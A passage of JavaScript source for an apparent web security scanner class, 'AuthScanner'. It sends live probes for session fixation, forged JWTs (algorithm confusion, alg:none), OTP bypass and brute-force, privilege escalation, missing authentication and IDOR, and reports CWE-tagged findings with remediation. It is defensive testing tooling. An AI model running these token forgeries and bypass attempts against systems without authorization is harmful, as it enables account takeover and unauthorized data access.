      const loginPage = await httpGet(loginUrl, { timeout: this.timeout });
      if (loginPage.status !== 200) continue;

      const preLoginCookie = loginPage.headers?.['set-cookie'];
      if (!preLoginCookie) continue;

      const preSession = (Array.isArray(preLoginCookie) ? preLoginCookie : [preLoginCookie])
        .find(c => c.startsWith(cookieName));
      const preSessionValue = preSession?.split('=')[1]?.split(';')[0];

      if (preSessionValue) {
        // Simulate login with the pre-auth session
        const loginResp = await httpPost(loginUrl, 'username=test&password=test', {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
          headers: { 'Cookie': `${cookieName}=${preSessionValue}` },
        });

        const postLoginCookie = loginResp.headers?.['set-cookie'];
        if (postLoginCookie) {
          const postSession = (Array.isArray(postLoginCookie) ? postLoginCookie : [postLoginCookie])
            .find(c => c.startsWith(cookieName));
          const postSessionValue = postSession?.split('=')[1]?.split(';')[0];

          if (postSessionValue && postSessionValue === preSessionValue) {
            findings.push(this._createFinding({
              type: 'session-fixation-no-regen', title: 'Session Not Regenerated After Authentication',
              severity: 'high', url: loginUrl, parameter: `Cookie: ${cookieName}`,
              payload: `Pre-auth: ${preSessionValue}, Post-auth: ${postSessionValue}`,
              evidence: 'Session ID remains the same before and after authentication attempt',
              request: `POST ${loginUrl}\nCookie: ${cookieName}=${preSessionValue}`,
              response: `Session unchanged: ${postSessionValue}`,
              remediation: 'Always regenerate session ID after successful authentication.',
              cwe: 'CWE-384', owasp: 'A07:2021 Identification and Authentication Failures',
            }));
          }
        }
      }
      break;
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // JWT ATTACKS
  // ═══════════════════════════════════════════════════════════
  async scanJWTAttacks(url, options = {}) {
    const findings = [];
    const resp = await httpGet(url, { timeout: this.timeout });
    const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');
    const headers = resp.headers || {};

    // Find JWTs
    const jwtRegex = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
    const tokens = [];
    tokens.push(...(body.match(jwtRegex) || []));

    const setCookies = headers['set-cookie'];
    if (setCookies) {
      const cookieStr = Array.isArray(setCookies) ? setCookies.join('; ') : setCookies;
      tokens.push(...(cookieStr.match(jwtRegex) || []));
    }

    if (tokens.length === 0) return findings;

    for (const token of [...new Set(tokens)]) {
      const parts = token.split('.');
      if (parts.length < 3) continue;

      let header, payload;
      try {
        header = JSON.parse(base64Decode(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
        payload = JSON.parse(base64Decode(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
      } catch { continue; }

      // Check for expired token still accepted
      if (payload.exp && payload.exp < Math.floor(Date.now() / 1000)) {
        const expiredResp = await httpGet(url, {
          timeout: this.timeout,
          headers: { 'Authorization': `Bearer ${token}` },
        });
        if (expiredResp.status === 200) {
          findings.push(this._createFinding({
            type: 'jwt-expired-accepted', title: 'Expired JWT Token Still Accepted',
            severity: 'high', url, parameter: 'JWT exp claim',
            payload: `exp: ${payload.exp} (expired ${new Date(payload.exp * 1000).toISOString()})`,
            evidence: 'Server accepts JWT token that has already expired',
            request: `GET ${url}\nAuthorization: Bearer [expired token]`,
            response: `HTTP ${expiredResp.status} - Expired token accepted`,
            remediation: 'Always validate JWT expiration (exp claim). Reject expired tokens.',
            cwe: 'CWE-613', owasp: 'A07:2021 Identification and Authentication Failures',
          }));
        }
      }

      // Algorithm confusion: RS256 -> HS256
      if (header.alg === 'RS256' || header.alg === 'RS384' || header.alg === 'RS512') {
        const confusedHeader = { ...header, alg: 'HS256' };
        const confusedB64 = base64Encode(JSON.stringify(confusedHeader)).replace(/=/g, '');
        const confusedToken = `${confusedB64}.${parts[1]}.${base64Encode('test').replace(/=/g, '')}`;

        const confResp = await httpGet(url, {
          timeout: this.timeout,
          headers: { 'Authorization': `Bearer ${confusedToken}` },
        });

        if (confResp.status === 200) {
          findings.push(this._createFinding({
            type: 'jwt-alg-confusion', title: 'JWT Algorithm Confusion (RS256 -> HS256)',
            severity: 'critical', url, parameter: 'JWT alg header',
            payload: `Changed alg from ${header.alg} to HS256`,
            evidence: 'Server accepts token with switched algorithm - public key may be used as HMAC secret',
            request: `GET ${url}\nAuthorization: Bearer [alg-confused token]`,
            response: `HTTP ${confResp.status} - Algorithm confusion successful`,
            remediation: 'Enforce expected algorithm server-side. Never accept alg from token header alone.',
            cwe: 'CWE-327', owasp: 'A02:2021 Cryptographic Failures',
          }));
        }
      }

      // None algorithm
      const noneHeader = base64Encode(JSON.stringify({ alg: 'none', typ: 'JWT' })).replace(/=/g, '');
      const noneToken = `${noneHeader}.${parts[1]}.`;
      const noneResp = await httpGet(url, {
        timeout: this.timeout,
        headers: { 'Authorization': `Bearer ${noneToken}` },
      });

      if (noneResp.status === 200) {
        findings.push(this._createFinding({
          type: 'jwt-none-alg', title: 'JWT None Algorithm Accepted',
          severity: 'critical', url, parameter: 'JWT alg header',
          payload: 'alg: none (no signature)',
          evidence: 'Server accepts JWT with alg:none - no signature verification',
          request: `GET ${url}\nAuthorization: Bearer [none-alg token]`,
          response: `HTTP ${noneResp.status} - Unsigned token accepted`,
          remediation: 'Reject tokens with alg:none. Use strict algorithm allowlist.',
          cwe: 'CWE-327', owasp: 'A02:2021 Cryptographic Failures',
        }));
      }

      // Sensitive data in JWT payload
      const sensitiveKeys = ['password', 'secret', 'ssn', 'credit_card', 'cc_number', 'private_key'];
      for (const key of sensitiveKeys) {
        if (payload[key]) {
          findings.push(this._createFinding({
            type: 'jwt-sensitive-data', title: `Sensitive Data in JWT: "${key}" field`,
            severity: 'high', url, parameter: `JWT payload.${key}`,
            payload: `${key}: ${String(payload[key]).substring(0, 10)}...`,
            evidence: `JWT payload contains sensitive field "${key}" - visible to anyone with the token`,
            request: `Token payload contains: ${key}`,
            response: `JWT is not encrypted - sensitive data exposed in base64-encoded payload`,
            remediation: 'Never store sensitive data in JWT payload. Use encrypted JWE if needed.',
            cwe: 'CWE-312', owasp: 'A02:2021 Cryptographic Failures',
          }));
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // OTP BYPASS
  // ═══════════════════════════════════════════════════════════
  async scanOTPBypass(url, options = {}) {
    const findings = [];
    const baseUrl = this._getBaseUrl(url);
    const otpPaths = ['/verify-otp', '/otp/verify', '/2fa/verify', '/mfa/verify', '/verify', '/confirm-code'];

    for (const otpPath of otpPaths) {
      const otpUrl = `${baseUrl}${otpPath}`;
      const pageResp = await httpGet(otpUrl, { timeout: this.timeout });
      if (pageResp.status !== 200) continue;

      const pageBody = typeof pageResp.data === 'string' ? pageResp.data.toLowerCase() : '';
      if (!pageBody.includes('otp') && !pageBody.includes('code') && !pageBody.includes('verify')) continue;

      const codeField = pageBody.match(/name=["'](otp|code|token|verification_code|mfa_code)["']/i)?.[1] || 'otp';

      // Test 1: Empty OTP
      const emptyResp = await httpPost(otpUrl, `${codeField}=`, {
        timeout: this.timeout,
        contentType: 'application/x-www-form-urlencoded',
      });
      const emptyBody = typeof emptyResp.data === 'string' ? emptyResp.data.toLowerCase() : '';
      if (emptyResp.status === 200 && (emptyBody.includes('success') || emptyBody.includes('dashboard'))) {
        findings.push(this._createFinding({
          type: 'otp-bypass-empty', title: 'OTP Bypass: Empty Code Accepted',
          severity: 'critical', url: otpUrl, parameter: codeField,
          payload: `${codeField}=`,
          evidence: 'Empty OTP code accepted - 2FA completely bypassed',
          request: `POST ${otpUrl}\n${codeField}=`,
          response: `HTTP ${emptyResp.status} - Verification successful without code`,
          remediation: 'Validate OTP is non-empty and matches expected format. Require valid code.',
          cwe: 'CWE-287', owasp: 'A07:2021 Identification and Authentication Failures',
        }));
      }

      // Test 2: Common/default OTP values
      const commonOTPs = ['000000', '123456', '111111', '0000', '1234', '999999'];
      for (const otp of commonOTPs) {
        const resp = await httpPost(otpUrl, `${codeField}=${otp}`, {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
        });
        const respBody = typeof resp.data === 'string' ? resp.data.toLowerCase() : '';
        if (resp.status === 200 && (respBody.includes('success') || respBody.includes('dashboard') || respBody.includes('welcome'))) {
          findings.push(this._createFinding({
            type: 'otp-bypass-common', title: `OTP Bypass: Common Code "${otp}" Accepted`,
            severity: 'critical', url: otpUrl, parameter: codeField,
            payload: `${codeField}=${otp}`,
            evidence: `Common OTP "${otp}" accepted - weak or static OTP implementation`,
            request: `POST ${otpUrl}\n${codeField}=${otp}`,
            response: `HTTP ${resp.status} - Verification successful with common code`,
            remediation: 'Use cryptographically generated OTPs. Implement proper TOTP/HOTP.',
            cwe: 'CWE-287', owasp: 'A07:2021 Identification and Authentication Failures',
          }));
          break;
        }
      }

      // Test 3: No rate limiting on OTP (brute-force possible)
      const otpAttempts = [];
      for (let i = 0; i < 15; i++) {
        otpAttempts.push(httpPost(otpUrl, `${codeField}=${String(i).padStart(6, '0')}`, {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
        }));
      }
      const otpResults = await Promise.allSettled(otpAttempts);
      const otpResponses = otpResults.filter(r => r.status === 'fulfilled').map(r => r.value);
      const otpRateLimited = otpResponses.filter(r => r.status === 429);

      if (otpRateLimited.length === 0) {
        findings.push(this._createFinding({
          type: 'otp-no-rate-limit', title: 'OTP Brute-Force Possible: No Rate Limiting',
          severity: 'high', url: otpUrl, parameter: codeField,
          payload: '15 rapid OTP attempts',
          evidence: '15 OTP verification attempts accepted without rate limiting - brute-force feasible',
          request: `15x POST ${otpUrl}\n${codeField}=000000-000014`,
          response: `No 429 responses - all attempts processed`,
          remediation: 'Limit OTP attempts (3-5 max). Lock account after failures. Implement exponential backoff.',
          cwe: 'CWE-307', owasp: 'A07:2021 Identification and Authentication Failures',
        }));
      }

      // Test 4: OTP in response
      const respBody2 = typeof pageResp.data === 'string' ? pageResp.data : '';
      const otpInResponse = respBody2.match(/["']otp["']\s*:\s*["'](\d{4,8})["']/i) ||
                           respBody2.match(/code["']\s*:\s*["'](\d{4,8})["']/i);
      if (otpInResponse) {
        findings.push(this._createFinding({
          type: 'otp-in-response', title: 'OTP Code Leaked in Response',
          severity: 'critical', url: otpUrl, parameter: 'Response Body',
          payload: `OTP found: ${otpInResponse[1]}`,
          evidence: `OTP code "${otpInResponse[1]}" found in page response - defeats purpose of 2FA`,
          request: `GET ${otpUrl}`,
          response: `OTP value visible in response body`,
          remediation: 'Never include OTP in response. Send only via out-of-band channel (SMS, email, authenticator).',
          cwe: 'CWE-200', owasp: 'A07:2021 Identification and Authentication Failures',
        }));
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // BROKEN ACCESS CONTROL
  // ═══════════════════════════════════════════════════════════
  async scanBrokenAccessControl(url, options = {}) {
    const findings = [];
    const baseUrl = this._getBaseUrl(url);

    // Horizontal privilege escalation (accessing other users' data)
    const userEndpoints = [
      '/api/user/1', '/api/users/1', '/api/profile/1',
      '/api/account/1', '/user/1', '/profile/1',
      '/api/user/2', '/api/users/2', '/api/profile/2',
    ];

    for (const endpoint of userEndpoints) {
      const testUrl = `${baseUrl}${endpoint}`;
      const resp = await httpGet(testUrl, { timeout: this.timeout });

      if (resp.status === 200) {
        const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');
        if (body.includes('email') || body.includes('username') || body.includes('name')) {
          // Try accessing another user's data
          const altEndpoint = endpoint.replace(/\/(\d+)$/, (_, id) => `/${parseInt(id) + 1}`);
          const altUrl = `${baseUrl}${altEndpoint}`;
          const altResp = await httpGet(altUrl, { timeout: this.timeout });

          if (altResp.status === 200) {
            const altBody = typeof altResp.data === 'string' ? altResp.data : JSON.stringify(altResp.data || '');
            if (altBody !== body && altBody.length > 50) {
              findings.push(this._createFinding({
                type: 'horizontal-privilege-escalation', title: `Horizontal Privilege Escalation: ${endpoint}`,
                severity: 'high', url: testUrl, parameter: 'User ID',
                payload: `${endpoint} -> ${altEndpoint}`,
                evidence: `Can access different user data by changing ID (${endpoint} vs ${altEndpoint})`,
                request: `GET ${altUrl}`,
                response: `HTTP 200 - Different user's data returned (${altBody.length} bytes)`,
                remediation: 'Verify resource ownership server-side. Use session-based user identification.',
                cwe: 'CWE-639', owasp: 'A01:2021 Broken Access Control',
              }));
            }
          }
        }
      }
    }

    // Vertical privilege escalation (accessing admin functions)
    const adminEndpoints = [
      '/api/admin/users', '/api/admin/settings', '/api/admin/config',
      '/api/users', '/api/settings', '/api/config',
      '/admin/api/users', '/admin/api/settings',
    ];

    for (const endpoint of adminEndpoints) {
      const testUrl = `${baseUrl}${endpoint}`;
      const resp = await httpGet(testUrl, { timeout: this.timeout });

      if (resp.status === 200) {
        const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');
        if (body.length > 50 && (body.includes('[') || body.includes('{'))) {
          findings.push(this._createFinding({
            type: 'vertical-privilege-escalation', title: `Admin Endpoint Accessible Without Auth: ${endpoint}`,
            severity: 'critical', url: testUrl, parameter: 'Endpoint',
            payload: endpoint,
            evidence: `Admin endpoint ${endpoint} returns data without authentication`,
            request: `GET ${testUrl} (no auth headers)`,
            response: `HTTP 200 - Admin data returned (${body.length} bytes)`,
            remediation: 'Require authentication and admin role for all admin endpoints.',
            cwe: 'CWE-862', owasp: 'A01:2021 Broken Access Control',
          }));
        }
      }
    }

    // Method-based access control bypass
    const protectedEndpoints = ['/api/users', '/api/admin', '/api/settings'];
    for (const endpoint of protectedEndpoints) {
      const testUrl = `${baseUrl}${endpoint}`;
      const getResp = await httpGet(testUrl, { timeout: this.timeout });

      if (getResp.status === 401 || getResp.status === 403) {
        // Try other methods
        for (const method of ['POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS']) {
          const methodResp = await httpRequest(method, testUrl, { timeout: this.timeout });
          if (methodResp.status === 200) {
            findings.push(this._createFinding({
              type: 'method-based-bypass', title: `Access Control Bypass via ${method}: ${endpoint}`,
              severity: 'high', url: testUrl, parameter: 'HTTP Method',
              payload: `GET returns ${getResp.status}, ${method} returns 200`,
              evidence: `${method} bypasses access control that blocks GET requests`,
              request: `${method} ${testUrl}`,
              response: `HTTP 200 - Access granted via ${method} (GET was ${getResp.status})`,
              remediation: 'Apply consistent access control across all HTTP methods.',
              cwe: 'CWE-863', owasp: 'A01:2021 Broken Access Control',
            }));
            break;
          }
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // MISSING AUTHENTICATION
  // ═══════════════════════════════════════════════════════════
  async scanMissingAuth(url, options = {}) {
    const findings = [];
    const baseUrl = this._getBaseUrl(url);

    const sensitiveEndpoints = [
      { path: '/api/users', desc: 'User listing', severity: 'high' },
      { path: '/api/admin', desc: 'Admin API', severity: 'critical' },
      { path: '/api/config', desc: 'Configuration', severity: 'critical' },
      { path: '/api/settings', desc: 'Settings', severity: 'high' },
      { path: '/api/logs', desc: 'Application logs', severity: 'high' },
      { path: '/api/database', desc: 'Database access', severity: 'critical' },
      { path: '/api/export', desc: 'Data export', severity: 'high' },
      { path: '/api/backup', desc: 'Backup endpoint', severity: 'critical' },
      { path: '/api/upload', desc: 'File upload', severity: 'high' },
      { path: '/api/delete', desc: 'Delete endpoint', severity: 'critical' },
      { path: '/api/internal', desc: 'Internal API', severity: 'high' },
      { path: '/api/debug', desc: 'Debug API', severity: 'high' },
      { path: '/api/keys', desc: 'API keys', severity: 'critical' },
      { path: '/api/tokens', desc: 'Tokens', severity: 'critical' },
      { path: '/api/payments', desc: 'Payment data', severity: 'critical' },
      { path: '/api/orders', desc: 'Order data', severity: 'high' },
      { path: '/graphql', desc: 'GraphQL endpoint', severity: 'medium' },
      { path: '/api/v1/users', desc: 'Users API v1', severity: 'high' },
      { path: '/api/v2/users', desc: 'Users API v2', severity: 'high' },
      { path: '/internal/metrics', desc: 'Internal metrics', severity: 'medium' },
    ];

    for (const ep of sensitiveEndpoints) {
      const testUrl = `${baseUrl}${ep.path}`;
      const resp = await httpGet(testUrl, { timeout: this.timeout });

      if (resp.status === 200) {
        const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');
        // Verify it's actual data, not a generic page
        const isData = body.startsWith('{') || body.startsWith('[') ||
                      body.includes('"data"') || body.includes('"results"') ||
                      body.includes('"users"') || body.includes('"items"');

        if (isData && body.length > 50) {
          findings.push(this._createFinding({
            type: 'missing-auth', title: `No Authentication Required: ${ep.path} (${ep.desc})`,
            severity: ep.severity, url: testUrl, parameter: 'Authentication',
            payload: ep.path,
            evidence: `${ep.desc} endpoint accessible without any authentication (${body.length} bytes of data)`,
            request: `GET ${testUrl} (no Authorization header)`,
            response: `HTTP 200 - ${ep.desc} data returned without authentication`,
            remediation: 'Require authentication for all sensitive endpoints. Implement proper access control middleware.',
            cwe: 'CWE-306', owasp: 'A07:2021 Identification and Authentication Failures',
          }));
        }
      }

      await sleep(this.delay);
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // INSECURE DIRECT OBJECT REFERENCES (IDOR)
  // ═══════════════════════════════════════════════════════════
  async scanIDOR(url, options = {}) {
    const findings = [];
    const baseUrl = this._getBaseUrl(url);

    // Common IDOR-prone endpoints
    const idorEndpoints = [
      '/api/user/{id}', '/api/users/{id}', '/api/profile/{id}',
      '/api/account/{id}', '/api/order/{id}', '/api/orders/{id}',
      '/api/invoice/{id}', '/api/document/{id}', '/api/file/{id}',
      '/api/message/{id}', '/api/messages/{id}', '/api/ticket/{id}',
      '/api/report/{id}', '/api/transaction/{id}',
      '/user/{id}', '/profile/{id}', '/account/{id}',
      '/download/{id}', '/file/{id}', '/doc/{id}',
    ];

    const testIds = [1, 2, 3, 100, 1000];

    for (const endpointTemplate of idorEndpoints) {
      for (const id of testIds) {
        const endpoint = endpointTemplate.replace('{id}', String(id));
        const testUrl = `${baseUrl}${endpoint}`;
        const resp = await httpGet(testUrl, { timeout: this.timeout });

        if (resp.status === 200) {
          const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');

          // Check if it returns actual user/resource data
          const hasUserData = /email|username|phone|address|name|account/i.test(body);
          const hasResourceData = body.length > 50 && (body.startsWith('{') || body.startsWith('['));

          if (hasUserData || hasResourceData) {
            // Try adjacent IDs to confirm IDOR
            const adjacentId = id + 1;
            const adjacentUrl = `${baseUrl}${endpointTemplate.replace('{id}', String(adjacentId))}`;
            const adjacentResp = await httpGet(adjacentUrl, { timeout: this.timeout });

            if (adjacentResp.status === 200) {
              const adjacentBody = typeof adjacentResp.data === 'string' ? adjacentResp.data : JSON.stringify(adjacentResp.data || '');

              if (adjacentBody !== body && adjacentBody.length > 50) {
                findings.push(this._createFinding({
                  type: 'idor', title: `IDOR: ${endpointTemplate} (IDs ${id} and ${adjacentId} accessible)`,
                  severity: 'high', url: testUrl, parameter: 'Resource ID',
                  payload: `ID ${id} -> ${adjacentId}`,
                  evidence: `Different resources accessible by changing ID: ${id} (${body.length}b) vs ${adjacentId} (${adjacentBody.length}b)`,
                  request: `GET ${testUrl}\nGET ${adjacentUrl}`,
                  response: `Both return HTTP 200 with different data - no ownership verification`,
                  remediation: 'Verify resource ownership server-side. Use UUIDs instead of sequential IDs. Implement ABAC.',
                  cwe: 'CWE-639', owasp: 'A01:2021 Broken Access Control',
                }));
                break;
              }
            }
          }
        }
      }

      await sleep(this.delay);
    }

    // UUID-based IDOR (check if endpoint accepts any UUID)
    const uuidEndpoints = ['/api/user/', '/api/profile/', '/api/account/', '/api/document/'];
    const fakeUuid = '00000000-0000-0000-0000-000000000001';

    for (const ep of uuidEndpoints) {
      const testUrl = `${baseUrl}${ep}${fakeUuid}`;
      const resp = await httpGet(testUrl, { timeout: this.timeout });

      if (resp.status === 200) {
        const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');
        if (body.length > 50) {
          findings.push(this._createFinding({
            type: 'idor-uuid', title: `IDOR with UUID: ${ep}{uuid}`,
            severity: 'medium', url: testUrl, parameter: 'UUID',
            payload: fakeUuid,
            evidence: `Endpoint accepts arbitrary UUID and returns data (${body.length} bytes)`,
            request: `GET ${testUrl}`,
            response: `HTTP 200 - Resource data returned for arbitrary UUID`,
            remediation: 'Verify resource ownership even with UUIDs. UUIDs are not a security mechanism.',
            cwe: 'CWE-639', owasp: 'A01:2021 Broken Access Control',
          }));
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // HELPER METHODS
  // ═══════════════════════════════════════════════════════════
  _getBaseUrl(url) {
    try {
      const parsed = new URL(url);
      return `${parsed.protocol}//${parsed.host}`;
    } catch {
      return url.replace(/\/[^/]*$/, '');
    }
  }

  _createFinding(data) {
    return {
      id: generateId(data.type.toUpperCase().replace(/[^A-Z]/g, '').slice(0, 5)),
      type: data.type,
      title: data.title,
      severity: data.severity,
      url: data.url,
      parameter: data.parameter,
      payload: data.payload,
      evidence: data.evidence,
      request: data.request,
      response: data.response,
      remediation: data.remediation,
      cwe: data.cwe,
      owasp: data.owasp,
      timestamp: new Date().toISOString(),
    };
  }
}

export default AuthScanner;
